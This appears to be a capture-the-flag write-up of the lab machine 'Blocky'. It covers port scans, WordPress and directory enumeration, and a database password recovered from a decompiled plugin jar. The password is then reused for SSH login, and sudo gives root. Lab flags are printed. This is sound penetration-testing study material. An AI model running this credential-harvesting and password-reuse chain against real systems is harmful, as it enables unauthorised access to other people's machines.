# Scan

```bash
ghost@localhost [21:54:34] [~/Documents/hacking/tj-null-boxes/blocky] [master]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.37:21
Open 10.10.10.37:22
Open 10.10.10.37:80
Open 10.10.10.37:25565

PORT      STATE SERVICE   REASON  VERSION
21/tcp    open  ftp       syn-ack ProFTPD 1.3.5a
22/tcp    open  ssh       syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqVh031OUgTdcXsDwffHKL6T9f1GfJ1/x/b/dywX42sDZ5m1Hz46bKmbnWa0YD3LSRkStJDtyNXptzmEp31Fs2DUndVKui3LCcyKXY6FSVWp9ZDBzlW3aY8qa+y339OS3gp3aq277zYDnnA62U7rIltYp91u5VPBKi3DITVaSgzA8mcpHRr30e3cEGaLCxty58U2/lyCnx3I0Lh5rEbipQ1G7Cr6NMgmGtW6LrlJRQiWA1OK2/tDZbLhwtkjB82pjI/0T2gpA/vlZJH0elbMXW40Et6bOs2oK/V2bVozpoRyoQuts8zcRmCViVs8B3p7T1Qh/Z+7Ki91vgicfy4fl
|   256 5d7f389570c9beac67a01e86e7978403 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgEpgEZGGbtm5suOAio9ut2hOQYLN39Uhni8i4E/Wdir1gHxDCLMoNPQXDOnEUO1QQVbioUUMgFRAXYLhilNF8=
|   256 09d5c204951a90ef87562597df837067 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILqVrP5vDD4MdQ2v3ozqDPxG1XXZOp5VPpVsFUROL6Vj
80/tcp    open  http      syn-ack Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 4.8
|_http-title: BlockyCraft &#8211; Under Construction!
25565/tcp open  minecraft syn-ack Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kerne
```

Also run `reconnoitre` for additional scans

```bash
ghost@localhost [23:30:33] [~/Documents/hacking/tj-null-boxes/blocky] [master *]
-> % reconnoitre -t $IP -o . --services
  __
|\"\"\"\-=  RECONNOITRE
(____)      An OSCP scanner by @codingo_
...
```


# FTP

```bash
ghost@localhost [23:31:37] [~/Documents/hacking/tj-null-boxes/blocky] [master *]
-> % nmap -sV -Pn -vv -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oA '/home/ghost/Documents/hacking/tj-null-boxes/blocky/10.10.10.37/scans/10.10.10.37_21_ftp' 10.10.10.37

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack ProFTPD 1.3.5a
Service Info: OS: Unix

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 00:39
Completed NSE at 00:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 00:39
Completed NSE at 00:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.60 seconds
```


# 80 (blocky.htb)

It is running Wordpress server. From simple curl, I found the WordPress version (4.8).

```bash
ghost@localhost [21:57:51] [~/Documents/hacking/tj-null-boxes/blocky] [master]
-> % curl blocky.htb | grep 'content="WordPress'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 17767    0 17767    0     0  10728      0 --:--:--  0:00:<meta name="generator" content="WordPress 4.8" />
100 52227    0 52227    0     0  13633      0 --:--:--  0:00:03 --:--:-- 13636
```

Running `feroxbuster` gives a handful of URLs.

```bash
ghost@localhost [00:40:59] [~/Documents/hacking/tj-null-boxes/blocky] [master *]
-> % feroxbuster -u http://blocky.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -k

403      GET       11l       32w      289c http://blocky.htb/.php
403      GET       11l       32w      290c http://blocky.htb/.html
...
```

## Wordpress

Running WP scan gives the result not so much interesting result. But found a user `notch`.

## Wiki

Found a wiki page at http://blocky.htb/wiki

Tried running `feroxbuster` on Wiki but did not give much information.

## PHPMyAdmin

Standard PHPMyAdmin can be found at http://blocky.htb/phpmyadmin

## Cute file browser

Found a cute file browser at http://blocky.htb/plugins with some `.jar` files.

Decompressing `BlockyCore.jar` and de-compiling the `.class` file gives the following Java code with database credentials.
`root:8YsqfCTnvxAUeduzjNSXe22`

```java
import com.myfirstplugin.BlockyCore;  
  
public class BlockyCore {  
  public String sqlHost = "localhost";  
    
  public String sqlUser = "root";  
    
  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";  
    
  public void onServerStart() {}  
    
  public void onServerStop() {}  
    
  public void onPlayerJoin() {  
    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");  
  }  
    
  public void sendMessage(String username, String message) {}  
}
```


# User

Using the user `notch` I tried password reuse by SSH directly with `notch:8YsqfCTnvxAUeduzjNSXe22` where the password is from SQL database. It works!

```bash
ghost@localhost [01:04:17] [~/Documents/hacking/tj-null-boxes/blocky] [master *]
-> % ssh notch@blocky.htb

notch@Blocky:~$ cat user.txt
d7febdfb03c5bc1a31217dea27d93df4
```


# Privilege escalation

Nothing out of ordinary there.

```bash
notch@Blocky:~$ sudo -l
[sudo] password for notch:
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

Checking the `id` shows that the user is part of `sudo`

```bash
notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Therefore, `sudo su` gives root access.

```bash
notch@Blocky:~$ sudo su

root@Blocky:/home/notch# cd /root

root@Blocky:~# cat root.txt
c80b788349954a90423753105ab058d3
```
